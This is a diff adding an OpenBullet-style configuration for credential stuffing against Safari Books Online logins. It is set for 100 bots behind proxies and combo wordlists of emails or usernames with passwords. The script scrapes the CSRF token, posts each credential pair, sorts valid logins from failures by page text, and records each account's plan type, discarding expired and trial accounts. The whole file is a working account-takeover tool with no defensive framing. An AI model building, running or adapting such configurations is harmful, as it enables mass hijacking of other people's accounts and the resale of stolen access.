@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "safaribooksonline",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-13T00:55:25.2556578+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_TOKEN REQUEST GET "https://www.safaribooksonline.com/accounts/login/?next=/accounts/signin/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRFTOKEN PARSE "<SOURCE>" CSS "[name=csrfmiddlewaretoken]" "value" 0 -> VAR "CSRFTOKEN" "" "" 
+#REQUEST_LOGIN_(POST) REQUEST POST "https://www.safaribooksonline.com/accounts/login/?next=/accounts/signin/" AutoRedirect=TRUE 
+  CONTENT "csrfmiddlewaretoken=<CSRFTOKEN>&email=<USER>&password1=<PASS>&login=Sign+In&next=%2Faccounts%2Fsignin%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.safaribooksonline.com/accounts/login/?next=/accounts/signin/" 
+  HEADER "origin: https://www.safaribooksonline.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The password" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The password" 
+REQUEST GET "https://www.safaribooksonline.com/u/" AutoRedirect=TRUE 
+  CONTENT "https://www.safaribooksonline.com/u/" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.safaribooksonline.com/accounts/signin/" 
+PARSE "<SOURCE>" LR "data-account-type=\"" "\"" Recursive=FALSE -> CAP "PLAN" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Expired" 
+    KEY "DOCTYPE html><!--[if IE 8]><html class" 
+    KEY "data-account-type=\"Trial\"" 
